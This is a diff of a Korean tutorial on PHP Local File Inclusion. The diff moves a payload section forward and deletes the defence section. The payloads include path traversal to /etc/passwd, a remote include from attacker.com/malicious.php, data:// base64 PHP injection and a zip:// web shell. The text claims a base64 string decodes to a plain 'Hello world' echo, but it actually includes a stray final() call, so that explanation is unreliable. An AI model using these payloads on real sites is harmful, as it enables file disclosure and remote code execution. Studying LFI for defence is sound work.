@@ -28,6 +28,48 @@ http://example.com/vulnerable.php?page=../../../../etc/passwd
 
 위의 예에서 `../../../../etc/passwd`는 **상위 디렉터리로 이동하여** 시스템의 중요한 파일인 **`/etc/passwd`** 파일을 포함하려는 시도입니다. `/etc/passwd` 파일은 리눅스 시스템에서 사용자 계정 정보가 담겨 있는 파일로, 이를 포함하면 공격자는 시스템에 대한 중요한 정보를 얻을 수 있습니다.
 
+---
+
+### **LFI 취약점의 페이로드 예시**
+
+#### 1. **상위 디렉터리로 이동하여 민감한 파일 읽기**
+
+```http
+http://example.com/vulnerable.php?page=../../../../etc/passwd
+```
+
+* 위 URL은 시스템의 중요한 **`/etc/passwd`** 파일을 포함시키려는 시도입니다.
+
+#### 2. **`file://`을 사용하여 로컬 파일 읽기**
+
+```http
+http://example.com/vulnerable.php?page=file:///etc/hosts
+```
+
+* `file://`을 사용하여 시스템의 **`/etc/hosts`** 파일을 포함할 수 있습니다. 이 파일은 시스템의 호스트 이름 및 IP 주소 정보를 담고 있습니다.
+
+#### 3. **외부 웹 페이지의 파일 포함 (HTTP URL 사용)**
+
+```http
+http://example.com/vulnerable.php?page=http://attacker.com/malicious.php
+```
+* 참고 : 파일을 포함하지 않고 다른 페이지로의 리다이렉션을 원할 때는 다음과 같다.
+```
+https://example.com/school/?group=window.location=”https://maliciouswebsite.com”
+```
+
+* `http://`을 사용하여 **외부 서버**에서 악성 파일을 포함시킬 수 있습니다. 이 방법은 \*\*원격 파일 포함 (RFI)\*\*과 유사합니다.
+
+#### 4. **PHP 코드 인젝션 (Wrapper + Base64)**
+
+```http
+http://example.com/vulnerable.php?page=data://text/plain;base64,PD9waHAgZWNobyAnSGVsbG8gd29ybGQnOyBmaW5hbCgpOyA/Pg==
+```
+
+* `data://` 프로토콜과 Base64 인코딩을 이용하여 PHP 코드를 직접 포함할 수 있습니다. 위 예시에서 `PD9waHAgZWNobyAnSGVsbG8gd29ybGQnOyBmaW5hbCgpOyA/Pg==`는 `<?php echo 'Hello world'; ?>`라는 PHP 코드를 Base64로 인코딩한 것입니다.
+
+
+---
 
 
 ### **Wrapper를 이용한 LFI 취약점 악용**
@@ -50,6 +92,8 @@ php://filter : ?page_num=php://filter/convert.base64-encode/resource=[목적 파
 ```
 zip://        :  ?page_num=zip://file.zip#web_shell.php
 ```
+
+---
 
 #### **그 외 PHP Wrapper**
 * `file://`: 로컬 파일 시스템에서 파일을 읽을 때 사용
@@ -90,53 +134,3 @@ http://example.com/vulnerable.php?page=data:text/plain;base64,SGVsbG8gd29ybGQ=
 ```
 
 위 URL에서 `SGVsbG8gd29ybGQ=`는 "Hello world"를 Base64로 인코딩한 값입니다. 이는 PHP 코드로 실행될 수 있는 형식으로 변환될 수 있습니다.
-
-### **LFI 취약점의 페이로드 예시**
-
-#### 1. **상위 디렉터리로 이동하여 민감한 파일 읽기**
-
-```http
-http://example.com/vulnerable.php?page=../../../../etc/passwd
-```
-
-* 위 URL은 시스템의 중요한 **`/etc/passwd`** 파일을 포함시키려는 시도입니다.
-
-#### 2. **`file://`을 사용하여 로컬 파일 읽기**
-
-```http
-http://example.com/vulnerable.php?page=file:///etc/hosts
-```
-
-* `file://`을 사용하여 시스템의 **`/etc/hosts`** 파일을 포함할 수 있습니다. 이 파일은 시스템의 호스트 이름 및 IP 주소 정보를 담고 있습니다.
-
-#### 3. **외부 웹 페이지의 파일 포함 (HTTP URL 사용)**
-
-```http
-http://example.com/vulnerable.php?page=http://attacker.com/malicious.php
-```
-* 참고 : 파일을 포함하지 않고 다른 페이지로의 리다이렉션을 원할 때는 다음과 같다.
-```
-https://example.com/school/?group=window.location=”https://maliciouswebsite.com”
-```
-
-* `http://`을 사용하여 **외부 서버**에서 악성 파일을 포함시킬 수 있습니다. 이 방법은 \*\*원격 파일 포함 (RFI)\*\*과 유사합니다.
-
-#### 4. **PHP 코드 인젝션 (Wrapper + Base64)**
-
-```http
-http://example.com/vulnerable.php?page=data://text/plain;base64,PD9waHAgZWNobyAnSGVsbG8gd29ybGQnOyBmaW5hbCgpOyA/Pg==
-```
-
-* `data://` 프로토콜과 Base64 인코딩을 이용하여 PHP 코드를 직접 포함할 수 있습니다. 위 예시에서 `PD9waHAgZWNobyAnSGVsbG8gd29ybGQnOyBmaW5hbCgpOyA/Pg==`는 `<?php echo 'Hello world'; ?>`라는 PHP 코드를 Base64로 인코딩한 것입니다.
-
----
-
-### **LFI 취약점 방어 방법**
-
-1. **파일 경로 검증**: 사용자 입력으로 받은 파일 경로가 허용된 경로 내에 존재하는지 확인해야 합니다. 예를 들어, `page` 파라미터에 사용자 입력을 그대로 사용하지 말고, 사전 정의된 파일명만 허용해야 합니다.
-
-2. **`basename()` 함수 사용**: 파일 이름만을 추출해서 경로를 검증하도록 하고, 경로를 조작하여 상위 디렉터리로 이동할 수 없도록 해야 합니다. `basename()` 함수는 경로에서 파일 이름만 추출합니다.
-
-   ```php
-   $page = basename($_GET['page']);  // 상위 디렉터리 경
-   ```
